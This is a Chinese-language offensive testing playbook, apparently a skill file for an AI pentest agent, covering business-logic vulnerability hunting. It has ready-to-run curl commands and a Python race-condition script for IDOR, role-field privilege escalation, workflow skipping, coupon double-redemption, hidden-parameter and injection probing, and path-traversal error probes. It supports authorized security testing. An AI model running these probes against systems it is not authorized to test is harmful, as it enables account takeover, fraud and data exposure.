---
name: playbook-vuln-hunting
description: "Vuln Hunting 参考"
tags: [playbook, vuln-hunting, vuln, hunting]
intent: offensive
---
# Vuln Hunting 参考

SKILL.md 的展开版。每节给：检查清单 → 具体手法 → 证据形态。

---

## 通用准备：画出「状态与角色图」

挖任何功能前，先把这张图画出来（写在脚本注释或 fact 的 detail 里）。**跳过这步就是盲打**。

```
功能：<功能名，如「修改资料」>
├─ 角色
│   ├─ 匿名（无认证）
│   ├─ 普通用户（自己账号 A）
│   └─ 管理员（自己账号 B）
├─ 状态
│   ├─ 初始 / 待审核 / 已发布 / 已下架
│   └─ …
├─ 步骤
│   ├─ S1 上传
│   ├─ S2 提交
│   ├─ S3 审核
│   └─ S4 发布
└─ 参数（每个标出：是否前端可见 / 是否前端可控 / 是否后端校验）
   ├─ userId   ← 出现在 URL/Body，前端可见，可控
   ├─ role     ← **只出现在请求体、界面里没有** ← 重点
   └─ price    ← 前端算出来的 ← 重点
```

**画完之后要问的三个问题**：
1. 哪些参数**界面上看不到**但请求里有？（→ 维度 4）
2. 哪些步骤**可以跳过**？（→ 维度 2）
3. 有哪些状态**不该允许操作**？（→ 维度 3）

---

## 维度 1：对象换位（越权）

### 检查清单
- [ ] 每一个带 ID 的参数（路径/body/query）
- [ ] 每一个标识身份/角色的字段（`uid` `user_id` `role` `is_admin` `dept_id` `tenant_id`）
- [ ] 每一个「对象类型」标记（`type` `kind` `object`）

### 手法

**水平越权（自己的两个对象）**
```bash
# 先用账号 A 拿到自己的对象 id
curl -s -H "Authorization: Bearer $TOKEN_A" "https://t/api/orders" | python3 -m json.tool | head -40
# 再把 id 换成账号 A 的另一个对象
curl -s -H "Authorization: Bearer $TOKEN_A" "https://t/api/orders/OTHER_ID" | head -c 500
```
成功标准：**返回了不属于该 token 的数据**（不是 403/404 空）。

**垂直越权（改角色字段）**
```bash
# 正常请求体里有 role 字段 → 改成 admin
curl -s -X PUT "https://t/api/user/profile" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' \
  -d '{"nickname":"x","role":"admin","is_admin":true,"is_vip":1}' | head -c 500
```
**关键**：要拿到**正常的请求体**才能知道有哪些字段 → 先抓基线流量（`traffic_search`）。

**认证缺失**
```bash
# 完全去掉认证头
curl -s "https://t/api/user/info" | head -c 300
# 用无效 token
curl -s -H "Authorization: Bearer invalid" "https://t/api/user/info" | head -c 300
```

**类型混淆**
```bash
for v in 0 -1 999999999 abc null [] ""; do
  echo "--- $v ---"
  curl -s "https://t/api/order/$v" | head -c 200; echo
done
```

### 证据形态
```
账号 A（uid=1001，普通用户）携带自己的 token，
GET /api/orders/2002（2002 属于账号 A 的另一个对象）返回了完整订单数据，
而同接口请求账号 B 的对象 3003 返回 403。
→ 水平越权，边界仅按对象归属校验、未校验与 token 的绑定关系
```
记录：A/B 两个 uid、两个对象 id、两次请求的响应差异。

---

## 维度 2：流程拆解（跳过步骤 / 直接调后续接口）

### 检查清单
- [ ] 从基线流量里挑出**同一个功能的多个接口**
- [ ] 按请求顺序排出步骤 S1→S2→S3
- [ ] 找出哪些 S 步骤是「提交后由服务端自动做」的

### 手法

**直接调末步**
```bash
# 从流量里看到：S1 POST /upload → S2 POST /order → S3 POST /order/confirm
# 只调 S3：
curl -s -X POST "https://t/api/order/confirm" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"orderId":1001}' | head -c 400
```

**跳过校验**（注册/验证/支付/审核/风控）
```bash
# 注册流程要邮箱验证码 → 直接调「设置密码」那一步
curl -s -X POST "https://t/api/user/set-password" -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' | head -c 400
```

**重放（幂等性）**
```bash
# 同一请求发两次，看是否重复扣款/重复发货/重复发券
# 响应存到本意图工作目录（平台规约：中间产物不落 /tmp）
curl -s -i -X POST "https://t/api/coupon/redeem" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"couponId":9}' > redeem1.txt
sleep 1
curl -s -i -X POST "https://t/api/coupon/redeem" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"couponId":9}' > redeem2.txt
```
再调 `diff_responses`（`file_a=redeem1.txt`、`file_b=redeem2.txt`）：
**无结构性差异 = 幂等**；有值差异（尤其数量/余额/状态类字段）= **重复生效**。
不要用 `diff` 逐字节比——响应里的时间戳/requestId 每次都不同，会误判成"两次不同"。

### 证据形态
```
正常流程：POST /api/order（返回 orderId=1001，status=pending）
→ POST /api/order/confirm（返回 success）
绕过：未创建订单，直接 POST /api/order/confirm {"orderId":1001} → 返回 success
→ 后端未校验订单存在性与归属，前置状态检查缺失
```

---

## 维度 3：状态机（非法转移 / 竞态）

### 检查清单
- [ ] 目标对象有没有生命周期（状态字段）
- [ ] 每个状态允许哪些操作
- [ ] 操作之间有没有「前置状态」校验

### 手法

**非法状态转移**
```bash
# 状态机：pending → paid → shipped → done
# 未支付就确认收货
curl -s -X POST "https://t/api/order/1001/confirm-receipt" -H "Authorization: Bearer $TOKEN" | head -c 400
# 已完成的订单再取消
curl -s -X POST "https://t/api/order/1001/cancel" -H "Authorization: Bearer $TOKEN" | head -c 400
```

**竞态（2~5 并发，小规模）**
```python
# 竞态验证脚本（写到本意图工作目录）
import concurrent.futures, requests, json, sys
URL = "https://t/api/coupon/redeem"
TOK = sys.argv[1] if len(sys.argv) > 1 else ""
H = {"Authorization": f"Bearer {TOK}", "Content-Type": "application/json"}
def hit(i):
    r = requests.post(URL, headers=H, json={"couponId": 9}, timeout=10)
    return i, r.status_code, r.text[:200]
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
    for i, code, body in ex.map(hit, range(5)):
        print(i, code, body)
```
**看什么**：多个请求里**是否都返回 success**（= 无唯一性约束/无锁）。
**先排除**：目标有唯一索引（DB 里看）或有幂等键 → 这种竞态多半不可利用，换方向。

**TOCTOU**（检查后使用）：先查余额/权限，再执行，中间状态被改。

### 证据形态
```
对 POST /api/coupon/redeem {"couponId":9} 同时发起 5 个请求，
返回体里 5 条全部为 {"success":true}，而优惠券券面额为 100 元。
单发一次时后端会校验该券是否已核销 → 说明校验与写入之间无原子性（无唯一约束、无锁），
5 个请求全部核销成功 → 超额核销。
```

---

## 维度 4：数据边界（信任边界 / 注入 / 二阶注入）

### 检查清单
- [ ] 每个请求参数的**来源**：URL？Body？Header？Cookie？
- [ ] 哪些参数在**前端 JS 里被赋值**（说明后端可能信任前端）
- [ ] 哪些参数**界面上看不到**（隐藏参数）
- [ ] 哪些数据会**存下来**（评论/昵称/文件/备注）→ 二阶注入候选

### 手法

**隐藏参数探测**
```bash
# 从基线流量里拿到正常 body，再逐个加字段试
for f in role is_admin is_vip level price status user_id uid group_id; do
  printf "%-10s " "$f"
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://t/api/user/update" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"nickname\":\"t\",\"$f\":1}"
  echo
done
```
**判读**：某个字段返回 200 且**后续状态真的变了**才算（用另一个账号/接口确认）。

**注入点定位**
- 找点优先级：报错信息 → 参数回显 → 布尔差异（`and 1=1` vs `and 1=2` 响应差异）→ 时间差异
- **不要用** `; DROP TABLE` 之类破坏性 payload 验证（违反平台拦截规则且不可逆）
- 用**无害**的差异型 payload 证明可控性

**二阶注入**
```bash
# 1) 存：把 payload 当昵称/评论提交
curl -s -X POST "https://t/api/comment" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"content":"MARKER_TEST"}' | head -c 200
# 2) 触发：找一个会把这条数据渲染/解析出来的地方（管理后台列表、导出、通知）
#    → 观察 MARKER_TEST 是否被当成语法解析
```

### 证据形态
```
POST /api/user/update 请求体含 {"role":"user"}（界面上无此字段），
提交 {"role":"admin"} 后返回 200，且用账号 A 重新登录后
GET /api/user/info 返回 {"role":"admin"} —— 后端直接采信前端传入的角色字段。
```

---

## 维度 5：资源假设

### 检查清单
- [ ] 有没有「只能存在一个」的资源（用户名、订单号、券码、邀请码）
- [ ] 有没有「限额」（每日次数、额度、并发数、长度）
- [ ] 有没有「有序」（审批、发布、上架）
- [ ] 有没有「必须存在」的前置对象

### 手法

**唯一性假设**
```python
# 并发注册同一用户名 / 核销同一券码 / 领取同一邀请码
# 见维度 3 的并发脚本模板
```

**限额绕过**
```bash
# 单次 1 个 → 试批量
curl -s -X POST "https://t/api/claim" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"count":100}' | head -c 300
# 计数器在前端 → 试直接调领取接口（绕过前端计数）
```

**长度/大小假设**
```bash
# 超长输入（1024/4096/65536）看是否截断后校验失效
python3 -c "print('A'*70000)" > payload.txt
# 用文件传参：
curl -s -X POST "https://t/api/profile" -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "name@payload.txt" | head -c 300
```

### 证据形态
```
POST /api/claim {"count":1} 单次领取 1 张券；
POST /api/claim {"count":100} 返回 200 且券包增加 100 张 ——
后端未对单次领取数量做上限校验（限额假设不成立）。
```

---

## 维度 6：错误路径

### 检查清单
- [ ] 每个接口的**非法输入**响应
- [ ] 「不存在」与「无权限」的响应差异
- [ ] 错误响应体里有没有敏感信息

### 手法

**报错泄露**
```bash
# 非法类型 / 非法格式 / 超长 / 特殊字符
for v in "1" "'" "\"" "<script>" "../../etc/passwd" "-1" "1e999" "null"; do
  echo "--- $v ---"
  curl -s "https://t/api/item/$v" | head -c 200; echo
done
```
**看什么**：堆栈trace、SQL片段、文件路径、内网地址、密钥片段、框架版本号。

**存在性枚举**
```bash
# 对比「不存在」与「存在但无权限」两种响应
# 两个响应都存到本意图工作目录（平台规约：中间产物不落 /tmp）
curl -s -i "https://t/api/user/999999" > user_999999.txt   # 不存在的
curl -s -i "https://t/api/user/1001"  > user_1001.txt     # 别人的
```
再调 `diff_responses`（给 `file_a=user_999999.txt`、`file_b=user_1001.txt`）：
**状态码不同或 JSON 键集合不同 → 可枚举**。工具会滤掉时间戳/trace id 这类噪声，
只留真正的结构性差异。
（工具的 `enumerable` 字段直接给这个判断，但**差异本身不是漏洞**——还要确认
"存在但无权限"返回的内容里没泄露他人数据；那才是越权。）